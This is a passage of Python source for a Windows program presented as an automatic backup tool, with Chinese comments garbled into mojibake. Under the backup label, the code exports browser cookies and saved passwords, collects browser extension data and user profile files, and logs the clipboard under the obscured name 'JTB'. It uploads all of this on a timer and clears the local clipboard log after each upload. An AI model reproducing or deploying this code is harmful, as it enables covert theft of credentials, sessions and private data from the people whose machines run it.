    logging.critical("ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨")
    logging.critical("="*50)
    logging.critical(f"â° å¯åŠ¨æ—¶é—´: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("-"*50)
    logging.critical("ğŸ“Š ç³»ç»Ÿç¯å¢ƒä¿¡æ¯:")
    for key, value in system_info.items():
        logging.critical(f"   â€¢ {key}: {value}")
    logging.critical("-"*50)
    logging.critical("ğŸ“‹ JTBç›‘æ§å’Œè‡ªåŠ¨ä¸Šä¼ å·²å¯åŠ¨")
    logging.critical("="*50)

    def read_next_backup_time():
        """è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            if os.path.exists(backup_manager.config.THRESHOLD_FILE):
                with open(backup_manager.config.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            next_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(backup_manager.config.THRESHOLD_FILE), exist_ok=True)
            with open(backup_manager.config.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None

    def should_backup_now():
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                # æ‰§è¡Œå¤‡ä»½ä»»åŠ¡
                logging.critical("\nğŸªŸ Windowsæ•°æ®å¤‡ä»½")
                all_backup_paths = backup_windows_data(backup_manager)
                
                # å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
                next_backup_time = write_next_backup_time()
                
                # è¾“å‡ºç»“æŸè¯­ï¼ˆåœ¨ä¸Šä¼ ä¹‹å‰ï¼‰
                has_backup_files = len(all_backup_paths) > 0
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("âŒ éƒ¨åˆ†å¤‡ä»½ä»»åŠ¡å¤±è´¥")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                
                # å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
                if all_backup_paths:
                    logging.critical("ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ–‡ä»¶...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("âœ… æ‰€æœ‰å¤‡ä»½æ–‡ä»¶ä¸Šä¼ æˆåŠŸ")
                    else:
                        logging.error("âŒ éƒ¨åˆ†å¤‡ä»½æ–‡ä»¶ä¸Šä¼ å¤±è´¥")
                
                # ä¸Šä¼ å¤‡ä»½æ—¥å¿—
                logging.critical("\nğŸ“ æ­£åœ¨ä¸Šä¼ å¤‡ä»½æ—¥å¿—...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"âŒ æ—¥å¿—å¤‡ä»½ä¸Šä¼ å¤±è´¥: {e}")
            
            # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡æ˜¯å¦éœ€è¦å¤‡ä»½
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥: {log_error}")
            # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿæ›´æ–°ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_windows_data(backup_manager):
    """å¤‡ä»½Windowsç³»ç»Ÿæ•°æ®ï¼Œè¿”å›å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼ˆä¸æ‰§è¡Œä¸Šä¼ ï¼‰
    
    Args:
        backup_manager: å¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        
    Returns:
        list: å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    backup_paths = []
    try:
        # ç›´æ¥å¤åˆ¶æŒ‡å®šç›®å½•å’Œæ–‡ä»¶ï¼ˆæ¡Œé¢ã€ä¾¿ç­¾ã€å†å²è®°å½•ç­‰ï¼‰
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        specified_backup_dir = backup_manager.backup_specified_files(
            os.path.expandvars('%USERPROFILE%'),
            os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_specified")
        )
        if specified_backup_dir:
            backup_path = backup_manager.zip_backup_folder(
                specified_backup_dir,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_specified_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("â˜‘ï¸ æŒ‡å®šç›®å½•å’Œæ–‡ä»¶å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            else:
                logging.error("âŒ æŒ‡å®šç›®å½•å’Œæ–‡ä»¶å‹ç¼©å¤±è´¥\n")
        else:
            logging.error("âŒ æŒ‡å®šç›®å½•å’Œæ–‡ä»¶æ”¶é›†å¤±è´¥\n")

        # å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®
        extensions_backup = backup_browser_extensions(backup_manager)
        if extensions_backup:
            backup_path = backup_manager.zip_backup_folder(
                extensions_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_browser_extensions_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("â˜‘ï¸ æµè§ˆå™¨æ‰©å±•æ•°æ®å¤‡ä»½æ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
            else:
                logging.error("âŒ æµè§ˆå™¨æ‰©å±•æ•°æ®å‹ç¼©å¤±è´¥\n")
        else:
            logging.error("âŒ æµè§ˆå™¨æ‰©å±•æ•°æ®æ”¶é›†å¤±è´¥\n")
        
        # å¯¼å‡ºæµè§ˆå™¨ Cookies å’Œå¯†ç 
        browser_export_file = export_browser_cookies_passwords(backup_manager)
        if browser_export_file:
            backup_paths.append(browser_export_file)
            logging.critical("â˜‘ï¸ æµè§ˆå™¨æ•°æ®å¯¼å‡ºæ–‡ä»¶å·²å‡†å¤‡å®Œæˆ\n")
        else:
            logging.warning("â­ï¸  æµè§ˆå™¨æ•°æ®å¯¼å‡ºè·³è¿‡æˆ–å¤±è´¥\n")
                    
    except Exception as e:
        logging.error(f"Windowsæ•°æ®å¤‡ä»½å¤±è´¥: {e}")
    
    return backup_paths

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """ç‹¬ç«‹çš„JTBä¸Šä¼ çº¿ç¨‹"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    last_upload_time = datetime.now()
    min_content_size = 100  # æœ€å°å†…å®¹å¤§å°ï¼ˆå­—èŠ‚ï¼‰
    
    while True:
        try:
            current_time = datetime.now()
            
            # æ£€æŸ¥æ˜¯å¦éœ€è¦ä¸Šä¼ ï¼ˆæ ¹æ®é…ç½®çš„é—´éš”æ—¶é—´ï¼‰
            if (current_time - last_upload_time).total_seconds() >= backup_manager.config.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    try:
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        file_size = os.path.getsize(clipboard_log_path)
                        if file_size > min_content_size:  # åªæœ‰å½“å†…å®¹è¶³å¤Ÿæ—¶æ‰ä¸Šä¼ 
                            # æ£€æŸ¥æ–‡ä»¶å†…å®¹
                            with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                                content = f.read().strip()
                                # æ£€æŸ¥æ˜¯å¦åªåŒ…å«å¯åŠ¨ä¿¡æ¯æˆ–ä¸Šä¼ è®°å½•
                                only_status_info = all(line.startswith('=== ğŸ“‹') for line in content.split('\n') if line.strip())
                                
                                if not only_status_info:
                                    # åˆ›å»ºä¸´æ—¶ç›®å½•
                                    temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'clipboard_logs')
                                    if backup_manager._ensure_directory(str(temp_dir)):
                                        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                                        backup_path = os.path.join(temp_dir, backup_name)
                                        
                                        try:
                                            # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
                                            shutil.copy2(clipboard_log_path, backup_path)
                                                
                                            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
                                            if backup_manager.upload_file(str(backup_path)):
                                                # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶
                                                try:
                                                    with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                                        f.write(f"=== ğŸ“‹ æ—¥å¿—å·²äº {current_time.strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼ å¹¶æ¸…ç©º ===\n")
                                                    last_upload_time = current_time
                                                except Exception as e:
                                                    logging.error(f"âŒ JTBæ—¥å¿—æ¸…ç©ºå¤±è´¥: {e}")
                                            else:
                                                logging.error("âŒ JTBæ—¥å¿—ä¸Šä¼ å¤±è´¥")
                                        except Exception as e:
                                            logging.error(f"âŒ å¤åˆ¶JTBæ—¥å¿—å¤±è´¥: {e}")
                                        finally:
                                            # æ¸…ç†ä¸´æ—¶ç›®å½•
                                            try:
                                                if os.path.exists(str(temp_dir)):
                                                    shutil.rmtree(str(temp_dir))
                                            except Exception as e:
                                                logging.error(f"âŒ æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                    except Exception as e:
                        logging.error(f"âŒ è¯»å–JTBæ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
                        
        except Exception as e:
            logging.error(f"âŒ å¤„ç†JTBæ—¥å¿—æ—¶å‡ºé”™: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
            continue
            
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´å†æ£€æŸ¥
        time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)

def clean_backup_directory():
    """æ¸…ç†å¤‡ä»½ç›®å½•ï¼Œä½†ä¿ç•™æ—¥å¿—æ–‡ä»¶å’Œæ—¶é—´é˜ˆå€¼æ–‡ä»¶"""
    backup_dir = os.path.expandvars('%USERPROFILE%\\Documents\\AutoBackup')
    try:
        if not os.path.exists(backup_dir):
            return
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        # éœ€è¦ä¿ç•™çš„æ–‡ä»¶
        keep_files = ["backup.log", f"{user_prefix}_clipboard_log.txt", "next_backup_time.txt"]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"ğŸ—‘ï¸ å·²æ¸…ç†: {item}")
            except Exception as e:
                logging.error(f"âŒ æ¸…ç† {item} å¤±è´¥: {e}")
                
        logging.critical("ğŸ§¹ å¤‡ä»½ç›®å½•å·²æ¸…ç†å®Œæˆ")
    except Exception as e:
        logging.error(f"âŒ æ¸…ç†å¤‡ä»½ç›®å½•æ—¶å‡ºé”™: {e}")

def main():
    """ä¸»å‡½æ•°"""
    try:
        # æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰å®ä¾‹åœ¨è¿è¡Œ
        pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'å¤‡ä»½ç¨‹åºå·²ç»åœ¨è¿è¡Œ (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # å†™å…¥å½“å‰è¿›ç¨‹PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # æ³¨æ„ï¼šæ—¥å¿—é…ç½®åœ¨ BackupManager.__init__ ä¸­è¿›è¡Œï¼Œæ— éœ€é‡å¤é…ç½®
        
        # æ£€æŸ¥ç£ç›˜ç©ºé—´
        try:
            backup_drive = os.path.splitdrive(BackupConfig.BACKUP_ROOT)[0]
            free_space = shutil.disk_usage(backup_drive).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'å¤‡ä»½é©±åŠ¨å™¨ç©ºé—´ä¸è¶³: {free_space / (1024*1024*1024):.2f}GB')
        except (OSError, IOError) as e:
            logging.warning(f'æ— æ³•æ£€æŸ¥ç£ç›˜ç©ºé—´: {str(e)}')
        
        try:
            # åˆ›å»ºå¤‡ä»½ç®¡ç†å™¨å®ä¾‹
            backup_manager = BackupManager()
            
            # æ¸…ç†æ—§çš„å¤‡ä»½ç›®å½•
            clean_backup_directory()
            
            # å¯åŠ¨å®šæœŸå¤‡ä»½å’Œä¸Šä¼ 
            periodic_backup_upload(backup_manager)
                
        except KeyboardInterrupt:
            logging.info('å¤‡ä»½ç¨‹åºè¢«ç”¨æˆ·ä¸­æ–­')
        except Exception as e:
            logging.error(f'å¤‡ä»½è¿‡ç¨‹å‘ç”Ÿé”™è¯¯: {str(e)}')
            # å‘ç”Ÿé”™è¯¯æ—¶ç­‰å¾…ä¸€æ®µæ—¶é—´åé‡è¯•
            time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
            main()  # é‡æ–°å¯åŠ¨ä¸»ç¨‹åº
            
    finally:
        # æ¸…ç†PIDæ–‡ä»¶
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'æ¸…ç†PIDæ–‡ä»¶å¤±è´¥: {str(e)}')

if __name__ == "__main__":
    main()